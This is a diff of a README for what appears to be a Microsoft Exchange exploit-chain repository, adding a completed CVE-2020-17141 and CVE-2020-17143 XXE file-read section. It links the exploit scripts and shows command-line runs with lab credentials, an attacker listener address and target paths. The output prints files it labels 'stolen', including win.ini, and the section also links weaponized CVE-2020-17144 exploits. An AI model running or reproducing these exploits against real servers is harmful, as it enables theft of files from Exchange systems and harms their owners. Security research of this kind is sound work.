@@ -22,7 +22,7 @@ ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exc
 | CVE-2020-16875 (completed) [youtube demo](https://www.youtube.com/watch?v=HZ20U4VW2wA) | [CVE-2020-16875](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-16875) | Sep 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution | yes |
 | CVE-2020-17132 (completed) [youtube demo](https://www.youtube.com/watch?v=S9S2YChZK7k) | [CVE-2020-17132](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-17132) | Dec 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution CVE-2020-16875 bypass | yes |
 | CVE-2020-17083(completed) [youtube demo](https://www.youtube.com/watch?v=fVoTnd1tBMc) | [CVE-2020-17083](https://msrc.microsoft.com/update-guide/en-us/advisory/CVE-2020-17083) | Nov 10, 2020 | Microsoft Exchange Server Remote Code Execution Vulnerability | yes |
-| CVE-2020-17143 | [CVE-2020-17143]() |  |  | yes |
+| CVE-2020-17141 & CVE-2020-17143 xxe file read (completed) [youtube demo]() | [CVE-2020-17141 & CVE-2020-17143](https://msrc.microsoft.com/update-guide/en-us/advisory/CVE-2020-17143) | Dec 8, 2020 | Microsoft Exchange Server Information Disclosure Vulnerability | yes |
 | CVE-2020-17144 | [CVE-2020-17144]() |  |  | yes |
 | CVE-2021-24085 | [CVE-2021-24085](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2021-24085) | Feb 9, 2021 | An authenticated attacker can leak a cert file which results in a CSRF token to be generated. | yes |
 | CVE-2021-28482 | [CVE-2021-28482]() |  |  | yes |
@@ -549,17 +549,86 @@ PS C:\Users\Administrator\Desktop> .\cve-2020-17083.ps1 -server WIN-2FFDIR22V0Q.
 
  - ![](./pics/cve-2020-17083-2.png)
 
-# CVE-2020-17143
-## CVE-2020-17143 part links
+# CVE-2020-17141 & CVE-2020-17143 XXE file read exploitation chain (completed)
+## CVE-2020-17141 & CVE-2020-17143 part links
 
  - [Microsoft Exchange Server OWA OneDriveProUtilities GetWacUrl XML External Entity Processing Information Disclosure Vulnerability](https://srcincite.io/pocs/cve-2020-17143.py.txt)
+ - [Microsoft Exchange Server EWS RouteComplaint ParseComplaintData XML External Entity Processing Information Disclosure Vulnerability](https://srcincite.io/pocs/cve-2020-17141.py.txt)
 
-# CVE-2020-17144
+ - 影响exchange系统版本信息
+
+``` bash
+Microsoft Exchange Server 2019 Cumulative Update 7
+Microsoft Exchange Server 2019 Cumulative Update 6
+Microsoft Exchange Server 2016 Cumulative Update 18
+Microsoft Exchange Server 2016 Cumulative Update 17
+Microsoft Exchange Server 2013 Cumulative Update 23
+```
+
+| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
+| ----------- | ----------- | ----------- | ----------- | ----------- |
+| 测试成功 | Exchange Server 2016 累计更新 CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |
+| 测试失败 | Exchange Server 2013 累计更新 23 (KB4489622) 15.00.1497.002 | Exchange2013-x64-cu23.exe | 2021/5/3 | 1.6 GB |
+
+这是两个XXE漏洞利用链，漏洞的利用前提是需要一个低权限的账号，漏洞利用成功可读取管理员权限文件
+
+ - [cve-2020-17141](./CVE-2020-17141%20%26%20CVE-2020-17143/cve-2020-17141.py)
+
+此漏洞允许远程攻击者泄露受影响的Exchange Server的信息。利用此漏洞需要身份验证。特定的缺陷存在于对EWS service端点的RouteComplaint SOAP请求的处理过程中。这个问题是由于缺乏对用户提交的xml的适当验证造成的。攻击者可以利用此漏洞在SYSTEM上下文中泄露信息。
+
+ - ![](./pics/cve-2020-17141.png)
+
+``` bash
+(base) E:\1.recent-research\exchange\proxy-attackchain\CVE-2020-17141 & CVE-2020-17143>python cve-2020-17141.py 192.168.14.6 administrator@exchange2016.com:123456Wx.. 192.168.0.11:9090 "C:/Users/Administrator/Desktop/CVE-2020-17141.txt"
+(+) triggered xxe in exchange!
+(+) stolen: /leaked?<![CDATA[CVE-2020-17141 test text....
+fdvoid0 is here...]]>
+
+(base) E:\1.recent-research\exchange\proxy-attackchain\CVE-2020-17141 & CVE-2020-17143>python cve-2020-17141.py 192.168.14.6 administrator@exchange2016.com:123456Wx.. 192.168.0.11:9090 "C:/Windows/win.ini"
+(+) triggered xxe in exchange!
+(+) stolen: /leaked?<![CDATA[; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+]]>
+```
+
+ - [cve-2020-17143](./CVE-2020-17141%20%26%20CVE-2020-17143/cve-2020-17143.py)
+
+此漏洞允许远程攻击者泄露受影响的Exchange Server的信息。利用此漏洞需要身份验证。该特定缺陷存在于GetWacIframeUrlForOneDrive服务命令的处理过程中。这个问题是由于缺乏对用户提交的xml验证造成的。攻击者可以利用此漏洞在SYSTEM上下文中泄露信息。
+
+ - ![](./pics/cve-2020-17143.png)
+
+``` bash
+(base) E:\1.recent-research\exchange\proxy-attackchain\CVE-2020-17141 & CVE-2020-17143>python cve-2020-17143.py 192.168.14.6 administrator@exchange2016.com:123456Wx.. 192.168.0.11:9090 "C:/Users/Administrator/Desktop/CVE-2020-17141.txt"
+(+) triggered xxe in exchange server!
+(+) stolen: /leaked?%3C!%5BCDATA%5BCVE-2020-17141%20test%20text....%0D%0Afdvoid0%20is%20here...%5D%5D%3E
+
+(base) E:\1.recent-research\exchange\proxy-attackchain\CVE-2020-17141 & CVE-2020-17143>python cve-2020-17143.py 192.168.14.6 administrator@exchange2016.com:123456Wx.. 192.168.0.11:9090 "C:/Windows/win.ini"                         (+) triggered xxe in exchange server!
+(+) stolen: /leaked?%3C!%5BCDATA%5B;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5Bfiles%5D%0D%0A%5BMail%5D%0D%0AMAPI=1%0D%0A%5D%5D%3E
+```
+
+# CVE-2020-17144 ()
 ## CVE-2020-17144 part links
 
  - [CVE-2020-17144漏洞分析与武器化](https://www.zcgonvh.com/post/analysis_of_CVE-2020-17144_and_to_weaponizing.html)
  - [CVE-2020-17144 zcgonvh github exp](https://github.com/zcgonvh/CVE-2020-17144)
  - [Exchange2010 authorized RCE](https://github.com/Airboi/CVE-2020-17144-EXP)
+
+
+
+
+
+
+
+
+
+
+
+
 
 # CVE-2021-24085
 ## CVE-2021-24085 part links
